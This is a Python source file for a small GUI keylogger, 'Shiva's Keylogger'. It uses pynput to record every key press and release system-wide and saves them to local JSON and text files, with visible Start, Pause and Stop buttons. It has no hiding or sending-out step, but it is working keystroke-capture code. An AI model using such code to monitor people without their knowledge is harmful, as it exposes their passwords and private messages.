import tkinter as tk
from tkinter import ttk
from pynput import keyboard
import json
from ttkthemes import ThemedStyle

paused = False
key_list = []
key_strokes = ""
x = False


def on_press(key):
    global x, key_list
    if not paused:
        if x is False:
            key_list.append({'Pressed': f'{key}'})
            x = True
            if x is True:
                key_list.append({'Held': f'{key}'})
        update_json_file(key_list)


def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    if x is True:
        x = False
        update_json_file(key_list)
        key_strokes = key_strokes + str(key)
        update_txt_file(str(key_strokes))


def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log)


def update_txt_file(key):
    with open('logs.txt', 'w') as key_strokes_file:
        key_strokes_file.write(key)


def start_keylogger():
    global paused
    paused = False
    print("[+] Running Keylogger successfully!\n[!] Saving the key logs in 'logs.json' and 'logs.txt'")
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()


def pause_keylogger():
    global paused
    paused = not paused
    print("[.] Keylogger paused!" if paused else "[+] Keylogger resumed!")


def stop_keylogger():
    print("[x] Keylogger stopped!")
    root.destroy()


if __name__ == "__main__":
    root = tk.Tk()
    root.geometry("600x250")
    root.title("Shiva's Keylogger")

    style = ThemedStyle(root)
    style.set_theme("equilux")

    style.configure('TFrame', background='#f0f0f0', foreground='white')
    style.configure('Main.TButton', background='#f0f0f0',
                    foreground='white', bordercolor='red', lightcolor='#f0f0f0')

    main_frame = ttk.Frame(root, padding=10, style="Main.TFrame")
    main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))

    ttk.Label(main_frame, text="Shiva's Keylogger", font='Helvetica 14 bold',
              style="Main.TLabel").grid(row=0, column=0, columnspan=3, pady=10)

    start_button = ttk.Button(main_frame, text="Start",
                              command=start_keylogger, style="Main.TButton")
    start_button.grid(row=1, column=0, pady=10, padx=(0, 5))

    pause_button = ttk.Button(main_frame, text="Pause",
                              command=pause_keylogger, style="Main.TButton")
    pause_button.grid(row=1, column=1, pady=10, padx=(0, 5))

    stop_button = ttk.Button(main_frame, text="Stop",
                             command=stop_keylogger, style="Main.TButton")
    stop_button.grid(row=1, column=2, pady=10)

    root.columnconfigure(0, weight=1)
    root.rowconfigure(0, weight=1)
    main_frame.columnconfigure(0, weight=1)
    main_frame.columnconfigure(1, weight=1)
    main_frame.columnconfigure(2, weight=1)
    main_frame.rowconfigure(0, weight=1)
    main_frame.rowconfigure(1, weight=1)

    root.mainloop()
